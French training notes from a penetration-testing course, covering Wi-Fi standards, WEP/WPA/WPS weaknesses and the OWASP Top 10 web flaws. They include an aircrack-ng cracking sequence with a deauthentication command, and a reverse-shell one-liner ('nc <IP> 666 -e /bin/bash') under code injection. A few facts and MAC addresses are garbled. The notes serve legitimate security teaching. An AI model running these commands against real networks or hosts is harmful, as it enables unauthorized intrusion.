
# Lead Pentester Semaine 2

# Sécurité des réseaux

## Contraintes

Puissance de carte autorisée :  **20Dbm = 100mW**
Au dela on écrase les autres réseaux WIFI.

## Normes

Standard **IEEE** (Institute of Electrical and Electronics Engineers) 802.11 apparu en  **1985**
Standard de **couche 2**

**802.11 (1997) :**
- Débits théoriques : **2 Mb/s**  
- Bande de fréquences : **2.4 GHz**  
- 
**802.11a (1999) :** 
- Débit théorique : **54 Mb/s**  
- Bande de fréquences : **5 GHz**  

 **802.11b (1999) :**   
- Débit théorique : **11 Mb/s**  
- Bande de fréquences : **2.4 GHz**  

**802.11g (2003) :** 
* Débit théorique : **54 Mb/s**  
- Bande de fréquences : **2.4 GHz**  

**802.11n (2009) :**  
- Débit théorique : **600 Mb/s**  
- Bande de fréquences : **2.4 et 5 GHz**  

**802.11ac (janvier 2014) :**  
- Débit théorique : **1 Gb/s**  
- Bande de fréquences : **5 GHz**  

**802.11ax (Octobre 2018) :**  
- Débit théorique : **10,5 Gb/s**  
- Bande de fréquences : **2.4, 5 GHz**

**MIMO** signifie « Multiple Inputs, Multiple Outputs »,  antennes capables d’émettre et de recevoir à destination de plusieurs sources.

**Wifi Alliance :**   Consortium formé par six fabricants de matériels de télécommunications en  1999  pour inter-compatibilité entre équipements conformes 802.11.
Création de protocole d’authentification (WEP, WPA,  WPA2)

## nomenclature

- 802.11b ⇒ WIFI 1
- 802.11a ==>WIFI 2
- 802.11g ⇒ WIFI 3
- 802.11n ⇒ WIFI 4
- 802.11ac ⇒ WIFI 5
- Current ⇒ WIFI 6 qui oblige à posséder un radius

Puissance d'émission de la carte définit par sa fréquence d’onde  

**La carte se connectera automatiquement a la station avec la puissance  
la plus élevé**

## Fréquence d'onde

**Dbm :** puissance d’émission de la carte WIFI
 **Dbi :** Gain d’antenne  
- Plus le gain est élevé plus sa directivité l’est également  
- Dbm + Dbi = **PIRE**  

**directivité :** Capacité à se propager dans une seule et unique direction
**DBI** : L’antenne rajoute des DBM à la carte

**Multiplexage:**  Dissociation de la bande fréquence en ‘Sub-Channels
Ces canaux permettent d’éviter les interférences entre plusieurs point WI-FI  (évite la saturation d’une bande) ⇒ 13 disponibles en 2.4 Ghz

![enter image description here](https://zupimages.net/up/20/45/soda.png)

**non overlapping channels**: utilisation de  canaux qui ne partagent pas de bande fréquence.  
Du coup moins d'interférence.

### 2.4 Ghz : 
- 3 non-overlapping channels  
- Atténuation plus faible sur la distance  
- Atténuation plus faible lors du passage  dans des matériaux  
- Débits plus faibles  
- Sensible aux micro-ondes

### 5 Ghz :  
- 19 canaux pour le 5 GHz en Europe  (canaux indépendants)
- 24 non-overlapping channels  
- Plus forte atténuation sur la  distance  
- Plus forte atténuation lors du  passage dans des matériaux  
- Débits plus important

## Topologies

**SSID** : Service Set identifier ou ESSID : ‘Extended’ 

**BSSID :** Basic Service Set identifier  
Correspond à l’adresse physique de l’équipement, 6 Octets : 48 bits  
A chaque BSSID est associé un ESSID qui peut cependant être caché.

## Trames

**Beacon Frame**  
- Distribuée à tout utilisateur à portée  
- Permet la synchronisation à l’AP  
- Aucune protection sur les trames wifi /!\

### Probe Request & Response  

**P.Request :**  
- Paquet d’interrogation en diffusion(Broadcast) ou ciblé (SSID)  
- Informations similaire à Beacon Frame (SSID, Data rate)  
- Induit une probe Response  

 **P.Response :**  
- Transmis par l’AP  
- Informations nécessaires à l’authentification

## Détails techniques

Chaque carte réseau possède les paramètres suivants :  
- 1 filtre matériel (Hardware)  
- 1 filtre Logiciel (Software)

Les modes de cartes sont présentés dans le 802.11 :  
- Managed : Carte cliente  
- Master : Point d’accès
- **Monitor** : Carte en écoute (Sans-connexion)  
- Ad-Hoc : Point à point.  
- **Mode promiscuous** (Connecté)

### Mode Monitor  
-  couche 2  
- **Permet de visualiser le trafic sans être attaché à un point d’accès** (écoute des ondes)  
- Utilisé par la suite Aircrack-ng, permet d’écouter, récupérer et générer du trafic

### Mode Promiscuous (Filtre)  
- Couche 2 et 3  
- **Permet l’interception (sniffing) de tous les paquets (notamment ceux qui  
ne lui sont pas destinés)**  
- Utilisé notamment par Wireshark/TCPdump
- Il faut être connecté au réseau pour l'utiliser

### modes et filtres

Les cartes réseaux possèdent également des “filtres”:  
- Un filtre Hardware : Unicast  /Broadcast  / Multicast  / Promiscuous /!\  
- Une filtre Software (Kernel): Permet de détecter les cartes en mode promiscuité /!\  

![enter image description here](https://zupimages.net/up/20/45/3r3w.png)

## Outils

### Rfkill
- Gestionnaire d’équipement sans fil  (Permet de les lister, activer/désactiver )
- Gère les filtres de cartes (Logiciel et Hardware)

### Aircrack-ng
 
**Airmon-ng :** 

Permet de switch entre deux des 8 modes principaux, principalement **‘monitor**’ et le mode **‘managed’** (Client)  
- Permet de kill les process interférents avec le mode monitor
- Kill des process gênants (Optionnel)  

**Airodump-ng :**

 Permet de visualiser et capturer les trames  
- **Nécessite le mode Monitor**  
- Permet d’accéder aux informations des points d’accès environnants  BSSID/ESSID  
- Type de chiffrement & Authentification  
- Numéro de channel  

**Aireplay-ng :** 

Permet d’injecter des paquets dans un réseau, par exemple :  
- Générer du flux  
- Désauthentifier un client

**Airgeddon et Wifite:** 
Permet d’automatiser les attaques

## processus de pétage de wifi
couper les filtres

    `rfkill unblock all` 

clean du wifi local

    airmon-ng check kill

passage en mode monitor

    airmon-ng wlan0mon

analyse des flux wifi

    airodump-ng wlan0mon

écoute ciblée sur une AP

    airodump-ng wlan0mon -c 11 -d **BSSID** -a wlan0mon 

Enregistrer les flux

    airodump-ng wlan0mon -c 11 -d **BSSID** -a wlan0mon -w 

Couper les équipements pour récupérer le handshake lors de la reconnexion

    aireplay-ng -0 10 -a fb:bf:fb:bf:fb:bf:fb -c 9d:4d:8d:5d:5d:8zd wlan0mon

Péter le mot de passe

    crunch (avec pleins de commandes)


# Contexte de la menace

La diffusion des ondes électromagnétiques est “incontrôlable”  
N’importe qui est capable de capter ces ondes  
On peut interagir avec les réseaux sans fil

**War Driving**  
- Technique de balayage réseau ‘à la volée’   permettant de visualiser les points d’accès à proximité  
- Mode **monitor**

**Evil Twin**  

Création d’un point d'accès usurpant les caractéristiques d’un point  d'accès légitime (MITM)

# WEP (1997)

## Présentation

- Utilise l’algorithme symétrique **RC4**  
- Deux longueurs de clé possibles : **64 et 128 bits** dont **24 bits** servent pour  l'initialisation de la clé (**IV**)
- **La même clé est utilisée pour chiffrer et déchiffrer les données**  
- **Cette clé est partagée par tous les clients du réseau et par le point d'accès**

## Faiblesses

- Taille de la IV insuffisante  
- Génération de clés faibles (Faiblesses RC4)  
- Taille de clef insuffisante (40 ou 104 bits)

**Si deux flux différents sont chiffrés avec la même clef contenant le même IV, la clef RC4 pourra être reconstruite**

## Attaque

- Capture de trafic  
- Génération d'IV supplémentaires  
- Utilisation des clés faibles générées par RC4  
==> Déchiffrement et reconstitution de la clé WEP

# WPA (2003)

Wi-Fi Protected Access: Introduction à la norme 802.11i

**améliorations:**  
- **TKIP** : Temporal Key Integrity Protocol : **génère une clé **128 bits** par trame** (WEP : même clé pour toute la cellule et toutes  les trames)  
- Hash des IV
- Régénération de la TK / 10.000 paquets  
- Code d’intégrité (MIC) anti-replay
- Vecteur d’initialisation de **48 bits (24 bits pour WEP)**  

Conc clé TKIP à l'ouverture de session client/ap, puis tous les 10 000 paquets et sous clé TK à chaque paquet

# WPA 2 (2004)

Standard 802.11i !

**Nouveautés:**  
- **Remplacement TKIP par CCMP > AES Compliant**  
- **Four Way Handshake**  
- Compatibilité WPA2 CCMP désormais obligatoire

**CCMP:** Counter Mode CBC-MAC Protocol

## 802.11i :  

Introduit le terme RSN ‘Robust Security Network’  
Augmente les méthodes d'authentification et de chiffrement  

Chiffrement :  
- **TKIP : Utilisation améliorée du RC4**  
- **CCMP : CBC-MAC protocol, repose sur de l’AES**

## Authentification :  

WPA/WPA2 - Personal / Utilisation d’une **PSK “Pre-Shared Key**” symétrique entre le client et  l’AP  

WPA/WPA2 - Enterprise  ⇒ **Repose sur le protocole 802.1X (radius)**

### 4-Way Handshake :  
Basé sur unr clef partagée **(PMK) et (PTK) :**  
- **PMK**, Pairwise master Key : **Issue du mot de passe de l’AP (PSK)**, hashé en SHA1
- **PTK**, Pairwise Transient Key: **PMK + ANonce & SNonce + Macs adresses**

## Faiblesses

### WPA / WPA 2 PSK (Personal) :  

Vulnérable aux attaques par dictionnaire  
- capture du 4 way handshake  
- PMKID capture  

Vulnérabilité dans l'implémentation du 4 Way Handshake impactant la  confidentialité des échanges  

# WPS

Wifi Protected Setup
Très peu utilisé, surtout en entreprise

Mécanisme d’authentification à l’AP simplifié  
- Accès au réseau sans mémoriser un mot de passe  
- 2 modes de connexions principaux (5 au total)  
-- Utilisation d’un code PIN à 8 chiffres  
-- Appuyer sur le bouton WPS

## Faiblesses

Fonctionnement de l’algorithme de PIN :  
- Souvent fixé en usine : 12345670  
- Méthode obligatoire pour certification WPS  

## Attaques

- **PixieDust**: L’attaque consiste à bruteforce les 2 groupes soit 10.000 + 1000 => 11.000  possibilités
- **Bully** : permet de randomiser les PIN durant l’attaque
- **Koala**; consiste à intercepter le paquet  d’authentification que le routeur envoie lors de l’appuie sur le bouton

# 802.1X

Le 802.1x est un protocole d'authentification centralisé (Radius)  
Associé avec le protocole 802.11i (WPA/2 - Enterprise)

## Principe
 
**Le client 802.1X (« supplicant ») :** c’est le système à authentifier : par exemple une station voulant joindre le réseau Wi-Fi  

**Le contrôleur (« authenticator ») :** c’est l’entité qui contrôle l’accès au réseau,  par exemple le point d’accès d’un réseau sans fil  

**Le serveur d’authentification (« authentication server ») :** c’est l’entité qui  vérifie les accréditations présentées par le demandeur et qui prend la décision  d’autorisation

## Chiffrement

Le protocole **EAP** est destiné à encapsuler des protocoles d’authentification et  les informations de contrôle relatives.

Pour que les messages EAP puissent être transportés sur un réseau local, 802.1x  définit EAPOL (EAP over LAN) pour encapsuler les paquets EAP

- Utilisation de **radius** ou **diameter** 

## Authentification

- **TLS** qui nécessite un certificat pour le serveur comme pour le supplicant  
- **PEAP** où seul un certificat côté serveur est nécessaire, le supplicant  
utilisant un couple « utilisateur/mot de passe »
- **TTLS**, assez similaire à PEAP, mais non supporté par Microsoft Windows

# Sécurisation

Des sondes IDS  peuvent protéger les clients ainsi que les  stations  
- Déclenchement dans le cas d'une désauthentification
- Si un point d’accès avec le même ESSID apparait

## Sondes WIDS (2015)

**but:**  Volonté de protéger les clients Windows des  attaques courantes  
- Empêche la connexion aux honey pots  
- Reconstruit les beacons frames  
- Filtre les outils d’attaques  
- Reconnaît une zone de protection  
- Insensible aux filtres de carte

# Failles WEB

## Composants du Web

**Framework:** Permet l’intégration rapide d’un dev dans un projet en cours (génère du code tout seul)

**CMS:** Content Management System ⇒ sité clé en main (wordpress, joomela)

**AJAX:** évite de rafraichir la page à chaque requête (affiche le résultat de la requête dans un endroit bien précis de la page actuelle sans toucher au reste de la page)

![enter image description here](https://zupimages.net/up/20/45/34xm.png)

**DOM:** ce qui compose la page
Accessible et modifiable via JavaScript  
Permet d’accéder à la structure HTML

## HTTPS

### Headers:
- Permettent au client et au serveur de transmettre des informations supplémentaires  avec la requête ou la réponse.  
- Insensible à la casse  
- nom-du-header: valeur  
- Des en-têtes propriétaires personnalisés peuvent être ajoutés

## Status code

- **200 :** succès de la requête  
- **301 et 302 :** redirection, permanente / temporaire  
- **401 :** utilisateur non authentifié  
- **403 :** accès refusé  
- **404 :** page non trouvée  
- **500 et 503 :** erreur serveur

## Mémo Status code

- Commence par 1 : **Information**  
- Commence par 2 : **Succès**  
- Commence par 3 : **Redirection**  
- Commence par 4 : **Erreur client**  
- Commence par 5 : **Erreur serveur**

## Méthodes HTTP
**Methode= verb**

### GET  
C'est la méthode la plus courante pour demander une ressource. 
Une requête GET est  sans effet sur la ressource.

### POST  
Cette méthode doit être utilisée lorsqu'une requête envoi de la donnée à une  ressource. 
(Envoi de donnée à un formulaire de connexion, etc …)

### HEAD  
Cette méthode ne demande que des informations sur la ressource, sans demander la  ressource elle-même.  

### OPTIONS  
Cette méthode permet d'obtenir les options de communication d'une ressource ou du  serveur en général

### CONNECT  
Cette méthode permet d'utiliser un proxy comme un tunnel de communication.  

### TRACE  
Cette méthode demande au serveur de retourner ce qu'il a reçu, dans le but de tester  
et d'effectuer un diagnostic sur la connexion.

### PUT  
Cette méthode permet d'ajouter une ressource sur le serveur.  

### DELETE  
Cette méthode permet de supprimer une ressource du serveur.

## Cookie HTTP

- Il sert de “carte d’identité”, ID,  une fois authentifié à un serveur web
- Sans cookie, l’utilisateur devrait se connecter à chaque page visité
- enregistré dans le navigateur

## Curl

Utilitaire de navigation web, mozilla en ligne de commande
Va plus loin que wget
- Permet de requêter vers un serveur web  
- Forger/Éditer des requêtes  
- Ajouter des cookies  
- Router les requêtes HTTP via un proxy  
- Télécharger les réponses

## Inspection panel

**F12**
Les navigateurs web possède un inspecteur d’élément HTML permettant d’afficher et  modifier le code source (coté client)

## Debugger panel

Il permet d’analyser et/ou d'exécuter les fichiers JS présent sur la page  

## Network panel

Le panneau réseau permet d’analyser les requêtes HTTP avec headers, données envoyées, méthodes, etc …

## Storage panel

Contient les cookies de session du navigateur, souvent utilisé pour injecter, modifier ou récupérer un cookie pour l’injecter dans un  outil.


## Burp suite

Fonctionne comme un proxy qui intercepte tous les flux entre toi et un serveur web
Fait le café.

### Proxy

- Capture les trames HTTP(s)  
- Modifie les données et paramètres des requêtes HTTP  
- Permet d’envoyer les trames vers d’autres onglets pour traitement

### Repeater

Editer et rejouer les requêtes HTTP (avec réponse HTTP en temps réel)

### Intruder

Attaques automatisées personnalisables (fuzzing, bruteforce, …)

### Sequencer

Permet de tester la robustesse des algorithmes de randomisation des sessions

### Comparer

Permet de mettre en relation différentes réponses HTTP(s) pour établir des points de comparaison

### Decoder

Permet d’encoder ou de décoder des chaînes de caractères  
Cela peut être utile car les attaques au travers des navigateurs  ne sont pas viables

### Extender

Ajouter des modules et plugins à Burp

# TOP 10 OWASP 2017

TOP 10: tous les 4 ans

Connaitre les sites hébergés par un serveur web

    owasp* zap
    amass gobuster
    patator --dns_forward

## Injections

Le terme Injection est utilisé lorsque il est possible d’envoyer une chaine de caractère qui sera  
interprétée en tant que code et exécutée par le serveur distant

**DICT:** dictionnary

### Injection SQL

Injecter des commandes SQL dans le but d’accéder ou modifier les données d’une base de  
données à travers une entrée utilisateur d‘une page web  

Les variations avancées de cette attaque peuvent être utilisées pour écrire des fichiers arbitraires  sur le serveur et même pour exécuter des commandes système.

Exemples:

- **Code PHP:** Lorsque les métacaractères (‘“!*) ne sont pas bannis ou nettoyés, il seront  
potentiellement interprété permettant à l'attaquant d’échapper la requête  SQL et de la modifier
- **Test de l’input utilisateur:** récupérer message d'erreur dans la page web
- **Bypass d’authentification**: L’injection SQL est une condition OU qui quoi qu’il arrive retournera un TRUE  permettant d’échapper une vérification du champ password
- **Union Based:** permet d’unir d’autre colonne d’une autre table lorsque cela  n’est pas prévu dans le formulaire
- **Blind Time Based:** Utilisé lorsqu’une page web est vulnérable aux injections SQL mais n’affiche pas d’erreur  et consiste à envoyer un ordre de temps de réponse lorsque vrai ou faux

#### SQLMAP

Outil automatisant le processus de recherche et d’exploitation d’injection SQL

Il est capable d’énumérer les bases et colonnes ainsi que de dumper le  contenu  

Une fonctionnalité de recherche et d’exploitation via les googles dorks est  également disponibles

### Injection LDAP

Injecte des instructions LDAP (Lightweight Directory Access Protocol) pour exécuter des  
commandes, y compris l’octroi d’autorisations et la modification du contenu d’un arbre LDAP.  

Le principe est le même que l'injection SQL mais avec la syntax LDAP &, (, ), *

### Injection CRLF

Injecte une séquence de caractères CRLF (Carriage Return and Line Feed) imprévue utilisée pour  
diviser une en-tête de réponse HTTP et écrire des contenus arbitraires dans le corps de la  réponse.  

L’injection est souvent utilisés pour échapper les mécanisme de défense (Sanitization, regex,  
WAF, …) dans les injections SQL, injections de commandes, ...

### Injection de code

Injecte du code dans une application qui exécute des commandes système en tant qu’utilisateur  
de l’application Web.  
Les attaques avancées peuvent utiliser des vulnérabilités d’escalade pour obtenir des privilèges  
encore plus élevés si nécessaire.

Lorsqu’une injection de commande est possible, l’attaquant tente souvent d’obtenir un shell  
système via les techniques classique de pentest :  
- **Dropper**  (powershell -command dropper)
- **Reverse shell**  (nc <IP> 666 -e /bin/bash)
- **Information** de l’OS (whoami, uname -a)

### Header spoofing

Injection dans l’en-tête HTTP d’une requête pour lorsque ces données sont utilisées par  
l’application web.  

Vulnérabilité rare mais souvent combiné à d’autre vulnérabilités (LFI avec header injection)

### Injection XPath

Injecte des instructions dans une application web au travers de requêtes XPath. Cela permet  
d’accéder à des données privées ou contourner une authentification.

## Faiblesse du système d'authentification

Les faiblesses du système d’authentification concernent généralement une authentification peu  
robuste  
- Mots de passes faibles  
- Mauvaise gestion des sessions  
- Cookie de session devinable  
- Attaque cryptographique connue

###  Attaque  
- Brute force  
- Attaques par dictionnaire  
- Attaques sur les tokens de session

### Système faible si:
- Permet des attaques automatisées (credential stuffing)  
- Permet un bruteforce  
- Autorise des mots de passe faibles ou des couples login/mot de passe connus comme  
“Password1”, “admin/admin“  
- Utilise une mauvaise gestion du système de récupération de mots de passe  
- Utilise un algorithme de hachage faible
- Pas d’authentification multi-facteurs  
- Mauvaise gestion des id de session  et du système de déconnexion
- ID de session ou cookie prédictible (faible sécurité sur la génération)  

## Exposition de données sensibles

### Description

L’exposition de données sensibles est la mise à disposition de fichiers, documents sensibles  
pouvant impacter l’organisation  

Cette faiblesse est une des plus répandues ces dernières années et est souvent commise au niveau du service web (apache, nginx, …)  
- Mauvaise gestion des droits d’accès  
- Mauvaise gestion de l’arborescence  
- Fichiers sensibles exposés accidentellement

### Attaque

- Directory listing  
- Directory guessing  
- Google Dork  
- Index Of

### Outils 

#### dirbuster

Outil créé par l’OWASP, permettant d’énumérer les dossiers et fichiers sur un serveur web par  
bruteforce d’URL  
- Peut bruteforcer les dossiers ou fichiers  
- Bonne gestion des threads  
- Schéma de l’arborescence

#### dirsearch  

 Permet d’énumérer un serveur web par bruteforce d’URL  
- Possibilité de préciser des extensions à tester  
- Peut suivre les récursions de répertoire et liens subdirectory

### autres outils

**dirb**
**gobuster**

## XML EXTERNAL ENTITIES (XEE)

L’attaque XXE concerne les applications basés sur Web XML.

Elle consiste à inclure du contenu malicieux dans un document ou une requête XML  pour faire inclure des fichiers systèmes au serveur dans la réponse  

L’attaque est possible si l’attaquant a possibilité d’inclure son fichier XML (qui sera parsé et  
interprété par l’application) ou de modifier les inputs xml envoyés à l’applications
Par défaut, les vieux parsers XML autorisent des insertion d’entités externes au sein du  
document XML

Il est possible de détecter cette faiblesse à l’aide d’un **SAST, DAST** ou manuellement


## Faiblesse des contrôles d'accès

La faiblesse des contrôle d’accès est évoqués lorsque les accès à des fichiers, données ou menus  
d’administrations sont mal maitrisés  

- Pas de nettoyage ou de contrôle sur les entrées utilisateurs  
- Manque de tests de la part des développeurs  
- Les méthodes HTTP ne sont pas contrôlées  
- Mauvais design dans la gestion des droits

### Cross Site Request Forgery

La CSRF consiste à forger une requête web qui, lorsque la victime exécutera, l’action sera  
prise en compte avec la session de la victime

### Local file inclusion

La LFI permet à un attaquant d’inclure un fichier local via l’application cible, cela peut entraîner  
la sortie du fichier mais également une exécution de code sur le serveur web

### Remote File Inclusion  

la RFI permet d’inclure un fichier distant (hébergé sur un autre serveur) cela peut entraîner une  
exécution de code sur le serveur cible

### Insecure Direct Objet Reference  

IDOR se produit lorsqu’une application expose une référence d’un objet à un attaquant alors que  celui-ci ne lui est pas destiné.  
L’attaquant peut alors accéder à l’objet grâce au guessing de son nom ou peut falsifier la valeur  
de l’objet 
exemple: chopper un uid utilisateur dans un lien

### Verb Tampering  

HTTP Verb Tampering exploite les vulnérabilité d’authentification et contrôle d’accès via les  
méthodes HTTP.  
Beaucoup de mécanisme utilisent les contrôle par méthode HTTP, lorsque mal configuré,  
l’utilisation d’une méthode autre que celle prévu permet un bypass d’authentification

## Mauvaise config des controles d'accès

Souvent dû au mise en production “sortie de carton”, un manque de suivi de mise à jour,  
une mauvaise sécurité en couche

Les attaquants viseront des applications non patchées  
- Credentials par défaut  
- Pages inutilisées  
- Sites de recettes / développement  
- Index Of  

Les scans de vulnérabilités sont à même de détecter ce genre de faiblesses

### scénarios

**Logiciels non mis à jour:** OS, Web/App, Librairies, modules  

**Fonctions inutiles ou dangereuses activées ;** Ports ou services inutilisées, comptes non supprimés

**Mauvaise configuration de sécurité:** admin/admin  

**Messages d’erreurs affichés:** Erreur SQL ou php

**Configuration par défaut:** Vulnérabilité connus  install.php

La console d’administration du serveur n’est pas désactivée.  
Le listage des répertoires est activé.
Le serveur est livré avec des exemples d’applications non supprimées contenant des failles.
La configuration du serveur autorise l’affichage de l’état de la pile.

### outils

**wafw00f:** Permet de détecter si un WAF surveille le serveur web cible

## Cross-Site Scripting (XSS)

Type d’injection permettant de faire exécuter du code sur le navigateur de la victime, par le biais  
d’une page web pour généralement :  
*Redirection de page web  
* Voler des cookies  
* Défacement du site web

### XSS reflected

- Le code malveillant est injecté dans une requête HTTP (URI, paramètres, headers, etc …)  
- L’injection n’est pas stockée donc non persistante  
- Demande une interaction de la victime

**Minifiers d’URL:** tinyurl.com ou bitly

### XSS Stored  
Le code malveillant est enregistré en base de données (donc persistante)  
Il est restitué sur la page web demandée par une victime.

Le payload est injecté dans le formulaire (donc en base)  
Lorsqu’un utilisateurs consultera la page web contenant le payload, celui-ci sera exécuté  
sur le navigateur de la victime

### vol de cookie

Pour voler un cookie via XSS, l’attaquant a besoin de deux éléments :  
- Un payload javascript qui sera activé par la victime (envoyant le cookie sur le serveur  
web de l’attaquant)
- Un serveur web contenant un logger de cookie envoyé

## Désérialisation non sécurisée

Appelé injection d’objet, cela se produit lorsqu'une entrée utilisateur n’est pas nettoyé avant d’être  transmise à la fonction unserialize(), l’application reconstruit l’objet pouvant permettre des injections ou des bypass

Cette attaque reste difficile à mettre en oeuvre et demande une bonne compréhension du  
processus de déserialisation

## Composants vulnérables

Le terme composants vulnérable est évoqué lorsque les composants d’une applications ont des  
vulnérabilités connues (wordpress, jooemal, drupal)

Facilité à trouver des exploits sur internet : un peu de veille suffit à se tenir au courant des dernières vulnérabilités

### Scénarios  

**Composants vulnérables:** Injection via un thème ou plugins vulnérables  

**librairies vulnérables:** Librairie vulnérable au DOS ou injection  

**Vulnérabilités SSL:** Possibilités de downgrader l’algorithme SSL via les algorithmes faibles encore acceptés

### Scanner CMS  

Les outils de scan CMS permettent de mettre en lumières les vulnérabilités spécifiques au  
CMS cible (version, thèmes, plugins vulnérables, énumération utilisateurs, etc ...)  

**wpscan** cible principalement les wordpress  

**Joomscan** cible principalement les joomla  

**cmsmap** cible les cms les plus répandus (wp, drupal, joomla, moodle, ..)

**nikto:** Scanner web testant les inputs web, headers, composants vulnérables, mauvaises config)

**whatweb** Permet une énumération des composants logiciels du service web cible









